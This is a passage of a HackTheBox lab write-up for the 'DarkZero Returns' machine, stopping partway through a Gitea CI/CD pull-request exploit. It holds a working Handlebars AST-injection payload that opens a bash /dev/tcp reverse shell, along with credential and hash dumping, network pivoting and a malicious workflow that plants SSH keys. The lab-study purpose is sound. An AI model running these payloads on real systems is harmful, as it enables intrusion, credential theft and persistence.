# 🛡️ HTB - DarkZero Returns (Hard)

<p align="center">
  <img src="https://img.shields.io/badge/Platform-HackTheBox-green?style=for-the-badge&logo=hackthebox" alt="HackTheBox" />
  <img src="https://img.shields.io/badge/OS-Linux%20%2F%20Windows%20AD-blue?style=for-the-badge&logo=linux" alt="OS Linux / AD" />
  <img src="https://img.shields.io/badge/Difficulty-Hard-red?style=for-the-badge" alt="Hard Difficulty" />
</p>

---

### Target Information
- **Machine Name:** DarkZero Returns
- **Operating System:** Linux (Ubuntu 24.04) / Windows Server 2025 Active Directory (`darkzero.ext` & `darkzero.htb`)
- **Difficulty:** Hard (40 pts)
- **Primary Attack Vectors:** Handlebars AST Type Confusion RCE (CVE-2026-33937), Ligolo-ng Pivoting, Gitea CI/CD Context Confusion (CVE-2026-20750), Active Directory DACL Abuse (Child Object Creation), `ksu` Kerberos Escalation, Cross-Domain Trust Exploitation via Forged Golden Referral Tickets.

---

## Step 1 - Reconnaissance

Let's start our enumeration with a quick NMAP scan:

```bash
nmap -p- -sV -sC --min-rate 5000 -v -Pn 10.129.94.213
```

```text
Nmap scan report for dzcampaigns.htb (10.129.94.213)
Host is up (0.55s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD OPTIONS
|_http-title: DarkZero Campaigns
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 12:56
Completed NSE at 12:56, 0.00s elapsed
Initiating NSE at 12:56
Completed NSE at 12:56, 0.00s elapsed
Initiating NSE at 12:56
Completed NSE at 12:56, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 73.39 seconds
           Raw packets sent: 131084 (5.768MB) | Rcvd: 25 (1.100KB)
```

### Web Application Enumeration

This is something new now, because it is unusual for a Hard Windows machine to have only 2 Linux ports, while they are not even solid Windows ports, except web. Let's see what they have and try to understand the application and find a way to get in. The web application is hosted at **http://dzcampaigns.htb**.

![web-img](images/DarkZeroReturns/d1.png)

By looking at the front page it appears to be an ancient story and fictional characters, and the language used is very cryptic and ancient. Let's navigate the web application!

![web-img](images/DarkZeroReturns/d2.png)

![web-img](images/DarkZeroReturns/d3.png)

Here's the login page, with a registration API. Let's register and access the dashboard to see if we can get in.

![web-img](images/DarkZeroReturns/d4.png)

After registration and login, you'll be able to see the dashboard below:

![web-img](images/DarkZeroReturns/d5.png)

The dashboard provides us character creation ability, with their specific characteristics, storyline, role etc. and later on they appear in the web as an ancient character. There are other things as well, such as that dice roll feature, which provides a dice to roll and then displays a quote based on the six sides of the dice, which didn't yield anything of interest.

However, let's try creating a new character and see what actually happens:

![web-img](images/DarkZeroReturns/d6.png)

This is what the form looks like; we can fill up the form to add the character, and then it will appear in the web campaign:

![web-img](images/DarkZeroReturns/d7.png)

Once the character is created and added it will appear in the dashboard, providing three options to manipulate the character: **Inventory** provides a weapon to the character as their main weapon, **Edit** can be used to edit character information, and **Delete** removes the character.

![web-img](images/DarkZeroReturns/d7.5.png)

As mentioned earlier, the character can be seen in the home page. The catch is that despite all application-level enumeration, there is nothing else to be found out, like no subdomains or subdirectories. So there might be something within the application—something like SSRF, SSTI, or SQLi that we need to discover.

While enumerating the app I found a few `.js` files for form, dice, and app, but they are just chunked snippets of the application rather than the actual full source files.

To check for other vulnerabilities, I grabbed the request packet of the form while editing it to inspect the intercepted traffic:

![web-img](images/DarkZeroReturns/d8.png)

I tested for SSRF and XSS and got no leads for further enumeration, as the input fields were rendering strings as plain text; if it were vulnerable to XSS, it should have rendered as an HTML tag or executed JavaScript.

### Server-Side Template Injection (SSTI) Discovery

This led me to move towards Server-Side Template Injection (SSTI).

> 📌 **What is SSTI?**  
> Server-Side Template Injection is a critical web security vulnerability that occurs when an application embeds untrusted user input directly into a server-side web template engine without proper sanitization. Instead of treating the user's input as plain text, the server interprets it as executable code. This allows an attacker to inject malicious template directives, manipulate the server, read sensitive files, or completely compromise the system via Remote Code Execution (RCE).

SSTI can be tested on input fields, and the best place to check them is the character creation form, because the character gets saved on the server and the information immediately reflects in the home page. To do so, we need to understand where the form is being rendered.

First, let's try writing SSTI template payloads in all the input fields in the form:

![web-img](images/DarkZeroReturns/d8.5.png)

When clicking on the "Save info" button, the server returned an error of "Something Went Wrong". That might be due to input filters preventing special characters from being rendered. However, I tried simple strings inside the template like `{{canary}}` across all the input fields, and then discovered which input field is vulnerable to SSTI and where the template is being rendered:

![web-img](images/DarkZeroReturns/d10.png)

Closely look at the last two entries: for those entries I tried the `{{canary}}` template, and the `campaign_message` parameter's value returned completely empty. When the engine sees `{{canary}}`, it tries to look up a variable named `canary`. Because none exists, it renders an empty string—confirming SSTI on the `campaign_message` input field.

### Template Engine Differentiation & Probing

Now the situation is that an engine is evaluating our SSTI payload, but we don't yet know what engine that is. Many engines use the `{{ }}` "mustache" syntax (including Twig, Jinja2, Vue, Angular, and Mustache itself). To identify and further enumerate the engine, we need to understand how to differentiate between these engines and their syntactical structures:

| Payload | Expected Result (Handlebars) | Expected Result (Mustache) | Expected Result (Jinja2 / Twig / Smarty) | Technical Explanation / Purpose |
| :--- | :--- | :--- | :--- | :--- |
| `{{7*7}}` | Empty or Error | Empty or Error | `49` | Identifies Python/PHP/Ruby engines. Handlebars handles logic-less paths, not inline arithmetic. |
| `{{#if true}}VULN{{/if}}` | `VULN` | Error / Literal Text | Error / Literal Text | Verifies block helpers. Handlebars natively parses `#if`, which is invalid syntax in Jinja2 or Mustache. |
| `{{#with "test"}}{{this}}{{/with}}` | `test` | Error / Blank | Error / Literal Text | Distinguishes Handlebars from Mustache. Mustache cannot handle context shifting via the `#with` helper. |
| `{{this}}` or `{{.}}` | `[object Object]` (or context) | `[object Object]` (or context) | Error / Literal Text | Confirms JavaScript-backed context evaluation (Node.js runtime environment). |
| `{{constructor}}` | `[function Object]` (or leaked string) | Empty / Escape | Error / Literal Text | Proves server-side property access, paving the way for Prototype Pollution or SSTI RCE. |

I started testing with Handlebars payload syntax, and fortunately it worked. You can verify this by changing the `campaign_message` parameter's value to:

```handlebars
{{#if true}}VULN{{/if}}
```

If the engine passes the condition and returns the "VULN" string, Handlebars is confirmed. Let's see it practically by editing the message textarea with the Handlebars payload, saving it, and viewing the campaign message:

![web-img](images/DarkZeroReturns/d11.png)

![web-img](images/DarkZeroReturns/d12.png)

Here you can see that the value string returned in the message section is "VULN", which confirms Handlebars as the processing engine for this application.

The application did not disclose the Handlebars version via banners, artifacts, or traces. Behavioral probing (`{{constructor.name}}` → blank) indicated a hardened ≥4.7.x runtime, ruling out string-based constructor chains. While looking for possible open vulnerabilities for this particular version of Handlebars (which we assume is ≥4.7.x), I found a critical RCE CVE.

### Vulnerability Analysis: Handlebars AST Type Confusion (CVE-2026-33937)

> ⚠️ **CVE-2026-33937 — Handlebars.js JavaScript Injection via AST Type Confusion**  
> **Advisory Reference:** [GHSA-2w6w-674q-4c4q](https://github.com/advisories/GHSA-2w6w-674q-4c4q)  
> Handlebars.compile() accepts a pre-parsed AST object in addition to a template string. The `value` field of a `NumberLiteral` AST node is emitted directly into the generated JavaScript without quoting or sanitization. An attacker who can supply a crafted AST to compile() can therefore inject and execute arbitrary JavaScript, leading to Remote Code Execution on the server.

Before going any further, we need to understand how Handlebars works under the hood. Handlebars processes a template in three distinct stages:

1. **Parse** — The template *string* is converted into an Abstract Syntax Tree (AST) whose nodes describe the program (`Program`, `MustacheStatement`, `BlockStatement`, `PathExpression`, `SubExpression`, `StringLiteral`, etc.).
2. **Compile** — The AST is translated into a JavaScript function.
3. **Execute** — That function is invoked with a *context* object and produces HTML.

The entire security model rests on one core assumption: **the developer writes the AST (the program), while the user only supplies the context (the data).** CVE-2026-33937 completely inverts that assumption.

### Root Cause Analysis

The character endpoint accepts `campaign_message` as a JSON object and feeds it **directly into the Handlebars compiler as an already-parsed AST**. This abuses a legitimate engine capability — the compiler entry point in the canonical source (`compile()` in [handlebars-lang/handlebars.js](https://github.com/handlebars-lang/handlebars.js)) accepts either a template string *or* a pre-parsed AST object, skipping `parse()` when given an object. That feature exists for precompiled-template tooling; here it is reachable with **attacker-controlled input and zero validation**. Because the parser never runs, every parser-level restriction and any string sanitization is bypassed by definition: the attacker dictates each node the runtime will execute — which lookups, which sub-expressions, and which helper calls.

### From AST Control to Code Execution

With node-level control, the payload walks the JavaScript prototype chain from an innocuous value to the `Function` constructor, then invokes Node's module system:

```text
"s" → String.prototype.split → Array → Array.prototype.pop → function object
   → .constructor → Function("return process.mainModule.require('child_process')")
   → .execSync(...)   →   arbitrary OS commands as `darkzero`
```

Now with all that set, there are still certain things we need to do in order to achieve RCE.

### Attack Planning: Phase 1 — Proving JSON AST Compilation

To verify this execution path, we probe the AST inside the `campaign_message` parameter and look for the raw HTML result to confirm the vulnerability:

```text
_csrf=csrf_value&name=wasd&race=dasdad&class=sadw&backstory=dasdawda&campaign_message={"type":"Program","body":[{"type":"ContentStatement","value":"AST_IS_COMPILED"}],"blockParams":[],"decorators":[]}
```

This should return the string `"AST_IS_COMPILED"` from an already parsed AST:

![web-img](images/DarkZeroReturns/d13.1.png)

Looking at Burp Suite, I crafted the AST and sent it to the server. We need to URL-encode it because if sent raw it gets processed as plaintext, so ensure proper encoding is applied.

After following the redirection, it processes the AST and displays the string `"AST_IS_COMPILED"` in the HTML, confirming pre-compiled AST processing:

![web-img](images/DarkZeroReturns/d14.png)

Here we can see the string is returned as intended, confirming AST execution as demonstrated in the vulnerability advisory.

### Attack Planning: Phase 2 — Crafting the RCE Payload

While testing standard string-based Server-Side Template Injection (SSTI) payloads like `{{#if 1}}X{{/if}}` yielded empty responses, the breakthrough came from analyzing the client-side JavaScript. The application was sending the `campaign_message` field as a JSON object representing a Handlebars Abstract Syntax Tree (AST), which the server-side Express application was passing directly into `Handlebars.compile()`.

#### The Core Vulnerability: Flawed Code Generation

When Handlebars compiles an AST into executable JavaScript, it relies on the expected schema of the AST nodes. For a `NumberLiteral` node, the compiler expects the `value` property to be an actual number (e.g., `1`). It injects this value directly into the generated JavaScript code, resulting in:

```javascript
// Normal generated code
lookup(context, 1)
```

However, the compiler does not strictly validate the data type of the `value` property. If we supply a string containing arbitrary JavaScript instead of a number, the compiler blindly injects that string into the generated code:

```javascript
lookup(context, {},{})) + process.mainModule.require(...) //)
```

- `{},{}))` — Closes the `lookup()` function call prematurely.
- `+ process...` — Executes arbitrary Node.js code.
- `//` — Comments out trailing syntax so JavaScript does not throw a syntax error.

To achieve RCE, we craft the AST targeting the `lookup` helper and send it to the `/character/<id>` endpoint with `Content-Type: application/json`:

```json
{
  "_csrf": "<csrf_token>",
  "name": "asdffd",
  "race": "afdasfas",
  "class": "asdfasf",
  "backstory": "asfasfasas",
  "campaign_message": {
    "type": "Program",
    "body": [
      {
        "type": "MustacheStatement",
        "path": {
          "type": "PathExpression",
          "data": false,
          "depth": 0,
          "parts": ["lookup"],
          "original": "lookup",
          "loc": null
        },
        "params": [
          {
            "type": "PathExpression",
            "data": false,
            "depth": 0,
            "parts": [],
            "original": "this",
            "loc": null
          },
          {
            "type": "NumberLiteral",
            "value": "{},{})) + process.mainModule.require('child_process').execFileSync('/bin/bash',['-c','bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1\"']).toString() //",
            "original": 1,
            "loc": null
          }
        ],
        "escaped": true,
        "strip": { "open": false, "close": false },
        "loc": null
      }
    ],
    "strip": {},
    "loc": null
  }
}
```

This is the prototype for the reverse shell payload. We embed this AST inside the `campaign_message` parameter formatted as `application/json` to trigger our reverse shell.

---

## Step 2 - Initial Foothold

### AST Reverse Shell Execution

Start by intercepting the character edit request in Burp Suite, then embed the crafted AST inside the `campaign_message` parameter:

![web-img](images/DarkZeroReturns/d15.1.png)

The request pauses during execution, and the reverse shell connects back on our netcat listener:

```http
POST /character/15 HTTP/1.1
Host: dzcampaigns.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Origin: http://dzcampaigns.htb
Connection: close
Referer: http://dzcampaigns.htb/character/15/edit
Cookie: dz.sid=s%3AfjaHctdT10xw2NdZ4Bq48PfNgmEbtFRA.rV81%2BDbTaA4itydv%2FEeIvZoO0fvyXPKORz8MDD8zAQg
Content-Length: 1246

{
  "_csrf": "da79f0d7b875a8e24f13670df7fa2469bb811851165d650e9614b3d92cda698b",
  "name": "asdffd",
  "race": "afdasfas",
  "class": "asdfasf",
  "backstory": "asfasfasas",
  "campaign_message": {
    "type": "Program",
    "body": [
      {
        "type": "MustacheStatement",
        "path": {
          "type": "PathExpression",
          "data": false,
          "depth": 0,
          "parts": [
            "lookup"
          ],
          "original": "lookup",
          "loc": null
        },
        "params": [
          {
            "type": "PathExpression",
            "data": false,
            "depth": 0,
            "parts": [],
            "original": "this",
            "loc": null
          },
          {
            "type": "NumberLiteral",
            "value": "{},{})) + process.mainModule.require('child_process').execFileSync('/bin/bash',['-c','bash -c \"bash -i >& /dev/tcp/10.10.15.54/7986 0>&1\"']).toString() //",
            "original": 1,
            "loc": null
          }
        ],
        "escaped": true,
        "strip": {
          "open": false,
          "close": false
        },
        "loc": null
      }
    ],
    "strip": {},
    "loc": null
  }
}
```

On our listener, we catch a shell as user `darkzero`:

```bash
nc -lvnp 7986                     
listening on [any] 7986 ...
connect to [10.10.15.54] from (UNKNOWN) [10.129.96.90] 58696
bash: cannot set terminal process group (901): Inappropriate ioctl for device
bash: no job control in this shell
darkzero@SRV01:~$ id
uid=996(darkzero) gid=987(darkzero) groups=987(darkzero)
```

### Node.js Environment & Handlebars Verification

Now that we have initial shell access, we can inspect the exact version of the Handlebars engine which we were unable to determine remotely:

```bash
darkzero@SRV01:~$ cat package.json | grep handlebars
    "express-handlebars": "^7.0.7",
    "handlebars": "4.7.8",
```

The installed version `4.7.8` is precisely vulnerable to the AST type confusion exploit.

Further enumeration reveals the entire DarkZero web application directory structure:

```bash
darkzero@SRV01:~$ ls -la
total 84
drwxrwxr-x   6 darkzero darkzero  4096 Jul 14 06:10 .
drwxr-xr-x   6 root     root      4096 Jul 21 05:39 ..
-rw-------   1 darkzero darkzero   133 May 20 10:11 .env
drwxrwxr-x 158 darkzero darkzero  4096 May 19 11:11 node_modules
drwxrwxr-x   4 darkzero darkzero  4096 May 19 10:55 .npm
-rw-rw-r--   1 darkzero darkzero   644 May 19 11:11 package.json
-rw-rw-r--   1 darkzero darkzero 43128 May 19 11:11 package-lock.json
drwxrwxr-x   2 darkzero darkzero  4096 May 19 08:53 scripts
-rw-rw-r--   1 darkzero darkzero  4638 May 19 11:11 server.js
drwxrwxr-x  12 darkzero darkzero  4096 Apr 24 14:45 src
```

### Local System & Network Interface Enumeration

Inspecting the contents of `.env` reveals hardcoded database credentials:

```bash
darkzero@SRV01:~$ cat .env
PORT=8081
DB_HOST=localhost
DB_USER=darkzero
DB_PASSWORD=C4ntFindMyDMpass!
DB_NAME=darkzero_campaigns
SESSION_SECRET=DarkSession312#
```

We now have database credentials and custom port details, making database enumeration straightforward.

Checking network interfaces reveals an internal subnet interface, pointing directly to the internal Active Directory network:

```bash
darkzero@SRV01:~$ ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.16.20.3  netmask 255.255.255.0  broadcast 172.16.20.255
        ether 00:15:5d:f4:7c:02  txqueuelen 1000  (Ethernet)
        RX packets 4268  bytes 543570 (543.5 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 5279  bytes 2763586 (2.7 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 1038  bytes 2096137 (2.0 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1038  bytes 2096137 (2.0 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

### MySQL Database Enumeration & Credential Extraction

Let's begin inspecting the database tables:

```bash
darkzero@SRV01:~$ mysql -h 127.0.0.1 -u darkzero -p'C4ntFindMyDMpass!' darkzero_campaigns -e "SHOW TABLES;"
mysql: [Warning] Using a password on the command line interface can be insecure.

+------------------------------+
| Tables_in_darkzero_campaigns |
+------------------------------+
| campaign_messages            |
| campaigns                    |
| character_items              |
| characters                   |
| items                        |
| sessions                     |
| users                        |
+------------------------------+
```

The database contains a `users` table. Let's dump its contents:

```bash
darkzero@SRV01:~$ mysql -h 127.0.0.1 -u darkzero -p'C4ntFindMyDMpass!' darkzero_campaigns -e "SELECT * FROM users;"
mysql: [Warning] Using a password on the command line interface can be insecure.

+----+-----------------------+----------+--------------------------------------------------------------+--------+---------------------+
| id | email                 | username | password_hash                                                | role   | created_at          |
+----+-----------------------+----------+--------------------------------------------------------------+--------+---------------------+
|  1 | admin@dzcampaigns.htb | admin    | $2b$10$HDdWzYvp1IWFD9TB4JsuCerlh.vKchv/LmBruCmKGH19hPP7IXvjm | admin  | 2026-04-19 15:34:56 |
|  3 | josh@dzcampaigns.htb  | josh     | $2b$10$kX7QPjPIQI5hxJWV4a0HpO7UcdstuwLxP51LhHPFP5ceATiOKmVbK | player | 2026-05-19 14:31:30 |
|  4 | im@gmail.com          | wasw     | $2b$10$TAhYZTEHc/UnN0afT1V/dO171L5H5F.A3X.hrWBKyXPE.CyH3ggCW | player | 2026-08-26 21:26:05 |
+----+-----------------------+----------+--------------------------------------------------------------+--------+---------------------+
```

> 💡 **Credential Discovery & Password Recovery:**  
> We recovered credentials for users `admin` and `josh`. Although these are bcrypt hashes, cracking them won't be straightforward, even though their cost factor appears standard.  
> Due to high cracking computation times on local hardware, a peer from IRC with a high-performance cracking rig assisted in recovering the plaintext password for `josh`:
>
> **Plaintext Credential:** `josh` : `Rangers1`

### SSH Access as Josh

Now that we have the plaintext password, we can log in via SSH:

```bash
ssh josh@dzcampaigns.htb 

josh@SRV01:~$ id
uid=780601110(josh) gid=780600513(domain users) groups=780600513(domain users),780601111(repoaudit)
```

---

## Step 3 - Lateral Movement

### Internal Pivoting via Ligolo-ng Tunneling

While enumerating `josh`, I identified potential next steps regarding an internal Gitea service running on the system:

```bash
josh@SRV01:/tmp$ ps auxf | grep gitea
svc-run+    1408  0.0  1.1 1280288 21508 ?       Ssl  21:19   0:01 /opt/gitea-runner/act_runner daemon --config /opt/gitea-runner/config.yaml
josh        1934  0.0  0.1   6544  2284 pts/1    S+   22:06   0:00              \_ grep --color=auto gitea
```

A dedicated user named `svc-runner` is running the Gitea CI/CD runner process, and access to `/opt/gitea-runner` was restricted for `josh`. To interact with internal web services and the domain controller, we set up a tunnel using Ligolo-ng:

1. **Start the proxy server on your attack machine:**
   ```bash
   sudo ./proxy -selfcert
   ```

2. **Transfer the agent to the target machine, grant execution permissions, and establish the reverse connection:**
   ```bash
   josh@SRV01:/tmp$ ./agent -connect 10.10.15.54:11601 -ignore-cert
   WARN[0000] warning, certificate validation disabled     
   INFO[0000] Connection established                        addr="10.10.15.54:11601"
   ```

3. **In the Ligolo-ng console, select the session and start the tunnel:**
   ```text
   ligolo-ng » INFO[0148] Agent joined.                                 id=00155df47c02 name=josh@SRV01 remote="10.129.97.25:61184"
   ligolo-ng » session
   ? Specify a session : 1 - josh@SRV01 - 10.129.97.25:61184 - 00155df47c02
   [Agent : josh@SRV01] » start
   INFO[0163] Starting tunnel to josh@SRV01 (00155df47c02) 
   ```

4. **Configure the tun interface and local routing table:**
   ```bash
   sudo ip tuntap add user kali mode tun ligolo
   sudo ip link set ligolo up
   sudo ip route add 172.16.20.0/24 dev ligolo
   ```

5. **Verify routing connectivity to the internal domain controller:**
   ```bash
   ping -c 2 172.16.20.2 
   PING 172.16.20.2 (172.16.20.2) 56(84) bytes of data.
   64 bytes from 172.16.20.2: icmp_seq=1 ttl=64 time=318 ms
   64 bytes from 172.16.20.2: icmp_seq=2 ttl=64 time=481 ms

   --- 172.16.20.2 ping statistics ---
   2 packets transmitted, 2 received, 0% packet loss, time 1001ms
   rtt min/avg/max/mdev = 318.377/399.451/480.526/81.074 ms
   ```

### Internal Network Mapping & DC02 Reconnaissance

With routing established, let's map the internal domain controller (`172.16.20.2`):

```bash
nmap -p- -sV -sC --min-rate 5000 -v -Pn 172.16.20.2  
```

```text
Nmap scan report for dc02.darkzero.ext (172.16.20.2)
Host is up (0.83s latency).
Not shown: 65527 filtered tcp ports (no-response)
PORT      STATE SERVICE    VERSION
53/tcp    open  tcpwrapped
135/tcp   open  tcpwrapped
139/tcp   open  tcpwrapped
445/tcp   open  tcpwrapped
464/tcp   open  tcpwrapped
593/tcp   open  tcpwrapped
49669/tcp open  tcpwrapped
49772/tcp open  tcpwrapped

Host script results:
|_clock-skew: 6h59m23s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-08-26T22:24:10
|_  start_date: N/A
```

As suspected, Active Directory is hosted internally. We have the domain name `dc02.darkzero.ext` with LDAP, Kerberos, and SMB ports open. Let's add this domain name and the Gitea subdomain into `/etc/hosts`:

```text
172.16.20.2  dc02.darkzero.ext gitea.darkzero.ext
```

![web-img](images/DarkZeroReturns/d16.png)

![web-img](images/DarkZeroReturns/d17.png)

### Kerberos SPNEGO Authentication & Gitea SSPI Login

Attempting to log into the Gitea web interface using `josh`'s database credentials fails; however, Gitea has SSPI authentication enabled.

> 📌 **What is SSPI Login?**  
> SSPI (Security Support Provider Interface) is the Windows API used to negotiate secure authentication (such as Kerberos or NTLM) without transmitting plaintext credentials across the network. On Linux systems, the equivalent standard is GSSAPI (Generic Security Services Application Program Interface).  
> When an enterprise application like Gitea is integrated into Active Directory, it supports "Windows Authentication" or "SSPI Login".

#### Authentication Workflow Under the Hood:

1. **User Authentication:** The domain user (`josh`) authenticates to the domain-joined Linux system (`SRV01`) and receives a Kerberos Ticket Granting Ticket (TGT).
2. **Negotiate Challenge:** When accessing `http://gitea.darkzero.ext:3000/user/login?auth_with_sspi=1`, the web server responds with a `WWW-Authenticate: Negotiate` challenge.
3. **Service Ticket Acquisition:** The client requests a Service Ticket for the Gitea service principal (`HTTP/gitea.darkzero.ext`) from the Domain Controller.
4. **Ticket Presentation:** The client transmits the ticket within the `Authorization: Negotiate <ticket>` header.
5. **Session Establishment:** Gitea validates the ticket against the KDC, authenticates the user, and issues a web session cookie (`i_like_gitea`).

> 🎯 **Why We Use SSPI Authentication Here:**  
> We do not possess `josh`'s direct web UI password, or standard password logins may be administratively disabled. However, because `josh` possesses a valid Kerberos session at the OS level, we can leverage `curl` with SPNEGO negotiation to perform the handshake, extract the session cookie, and import it into our browser.

Let's begin by requesting a fresh Kerberos ticket as `josh`:

```bash
josh@SRV01:~$ export KRB5CCNAME=/tmp/josh.ccache
josh@SRV01:~$ echo "Rangers1" | kinit josh@DARKZERO.EXT
Password for josh@DARKZERO.EXT: 
Warning: Your password will expire in less than one hour on Tue 14 Sep 2100 02:48:05 AM UTC
```

Now let's perform the SPNEGO negotiation using `curl`:

```bash
josh@SRV01:~$ curl -v --negotiate -u : "http://gitea.darkzero.ext:3000/user/login?auth_with_sspi=1" 2>&1 | grep "Set-Cookie: i_like_gitea"
< Set-Cookie: i_like_gitea=2a9a6c00c4cd2ec2; Path=/; HttpOnly; SameSite=Lax
< Set-Cookie: i_like_gitea=2f36a78834091b76; Path=/; HttpOnly; SameSite=Lax
```

#### Command Flag Breakdown:
- `-v` — Enables verbose output so we can inspect HTTP response headers and handshake steps.
- `--negotiate` — Instructs `curl` to use SPNEGO (Simple and Protected GSSAPI Negotiation Mechanism) to negotiate Kerberos authentication using the active TGT.
- `-u :` — Required syntax flag for `curl` when using Negotiate authentication, specifying that credentials originate from the Kerberos credential cache.
- `2>&1 | grep ...` — Redirects standard error to standard output to capture headers, filtering specifically for Gitea's session cookie (`Set-Cookie: i_like_gitea`).

Copy the second `i_like_gitea` cookie into the browser and refresh the page:

![web-img](images/DarkZeroReturns/d18.png)

We are now authenticated as `darkzero_ext_josh`!

### Vulnerability Analysis: Gitea CI/CD Context Confusion (CVE-2026-20750)

Inspecting the Gitea version banner indicates version `1.25.0`, which is affected by a critical access control and context confusion vulnerability:

> ⚠️ **CVE-2026-20750 — Gitea CI/CD Context Confusion (Pwn Request Variant)**  
> Gitea contains an improper access control and workflow context evaluation vulnerability. When processing certain pull request events, Gitea fails to enforce proper boundary isolation between the head branch (fork) and the base branch (upstream repository), enabling unauthorized workflow execution.

#### Normal CI/CD Execution vs. The Context Confusion Flaw

1. **The Normal Flow (The Safety Net):**
   - **The Upstream Repository (Main Repo):** Contains the codebase and a CI/CD runner executing as `svc-runner`.
   - **The Attacker (Josh):** Lacks push access to the main branch.
   - **The Fork:** Josh forks the repository, adds custom workflow files, and submits a Pull Request.
   - **The Safety Mechanism:** Gitea recognizes that the pull request originates from an untrusted fork and halts automatic execution until an organization maintainer explicitly reviews and approves the workflow.

2. **The Flaw (The "Bait and Switch" Context Confusion):**
   The vulnerability exists in how Gitea 1.25 handles event triggers—specifically the `pull_request_review_comment` event. When a review comment is posted via the API:
   - Gitea retrieves the workflow definition from the **Head Branch** (the attacker's malicious fork).
   - Gitea assigns execution permissions based on the **Base Branch** (the trusted main repository).
   - **The Result:** The system treats the event as trusted internal discussion on the main repository, immediately dispatching the workflow to the runner without requiring administrative approval.

We can inspect the existing workflow configuration by checking `.gitea/workflows/main.yaml`:

![web-img](images/DarkZeroReturns/d19.png)

> 💡 **Execution Context Impact:**  
> Standard `pull_request` triggers from forks are sandboxed, but `pull_request_target` and `pull_request_review_comment` triggers become dangerous if they check out untrusted pull request code.  
> Furthermore, because `act_runner` on this host is configured with label `ubuntu:host` (executing directly on the host filesystem rather than inside an isolated Docker container), workflow execution translates directly to host command execution as `svc-runner`.

#### The Attack Strategy:
1. Fork the target repository (`DarkZero/DarkZero-Campaigns`).
2. Inject a malicious workflow triggered by `pull_request_review_comment`.
3. Open a Pull Request from our fork to the upstream `main` branch.
4. Post a review comment via the API to trigger the workflow execution.

### CI/CD Exploitation: Phase 1 — Gearing Up (Kerberos Auth & SSH Keys)

Every API call authenticates via Kerberos SPNEGO. We ensure our TGT is active and generate an SSH keypair to use as our persistence mechanism:

```bash
josh@SRV01:~$ echo "Rangers1" | kinit josh@DARKZERO.EXT
Password for josh@DARKZERO.EXT: 
Warning: Your password will expire in less than one hour on Tue 14 Sep 2100 02:48:05 AM UTC

josh@SRV01:~$ klist
Ticket cache: FILE:/tmp/josh.ccache
Default principal: josh@DARKZERO.EXT

Valid starting       Expires              Service principal
08/27/2026 21:28:05  08/28/2026 07:28:05  krbtgt/DARKZERO.EXT@DARKZERO.EXT
        renew until 09/03/2026 21:28:05
```

Generate an SSH keypair:

```bash
ssh-keygen -t ed25519 -f ./htb_key2 -N "" -q
export PUBKEY=$(cat ./htb_key2.pub)
```

### CI/CD Exploitation: Phase 2 — Repository Fork & Timestamped Branching

We fork the base repository into `josh`'s namespace and create a unique timestamped branch to prevent conflicts:

```bash
josh@SRV01:~$ # 1. Fork base repo into josh's namespace
curl -s --negotiate -u : -X POST -H "Content-Type: application/json" -d '{}' \
  "http://gitea.darkzero.ext:3000/api/v1/repos/DarkZero/DarkZero-Campaigns/forks" | jq '.full_name'

"darkzero-ext_josh/DarkZero-Campaigns"
```

```bash
josh@SRV01:~$ # 2. Create a unique branch on our fork
export BRANCH="pwn-$(date +%s)"
echo "[*] Branch name: $BRANCH"

curl -s --negotiate -u : -X POST -H "Content-Type: application/json" \
  -d "{\"new_branch_name\":\"$BRANCH\", \"old_branch_name\":\"main\"}" \
  "http://gitea.darkzero.ext:3000/api/v1/repos/darkzero-ext_josh/DarkZero-Campaigns/branches" | jq '.name'

[*] Branch name: pwn-1787866364
"pwn-1787866364"
```

### CI/CD Exploitation: Phase 3 — Payload Delivery (Malicious Workflow Injection)

We define a workflow listening on `pull_request_review_comment` that writes our SSH public key to `/home/svc-runner/.ssh/authorized_keys`:

```bash
cat > /tmp/pwn.yml << EOF
name: pwn
on:
  pull_request_review_comment:
    types: [created]
jobs:
  pwn:
    runs-on: ubuntu
    steps:
      - name: persist
        run: |
          install -d -m 700 /home/svc-runner/.ssh
          echo '$PUBKEY' >> /home/svc-runner/.ssh/authorized_keys
          chmod 600 /home/svc-runner/.ssh/authorized_keys
          cat /home/svc-runner/user.txt
EOF
```

Encode the file in Base64 and upload it via the Gitea Contents API:

```bash
export CONTENT_B64=$(base64 -w0 /tmp/pwn.yml)

curl -s --negotiate -u : -X POST -H "Content-Type: application/json" \
  -d "{\"content\":\"$CONTENT_B64\", \"message\": \"add workflow\", \"branch\": \"$BRANCH\"}" \
  "http://gitea.darkzero.ext:3000/api/v1/repos/darkzero-ext_josh/DarkZero-Campaigns/contents/.gitea%2Fworkflows%2Fpwn.yml" | jq '.content.path'

".gitea/workflows/pwn.yml"
```

### CI/CD Exploitation: Phase 4 — Bug Trigger via PR Review Comment

We submit a Pull Request from our branch to upstream `main`:

```bash
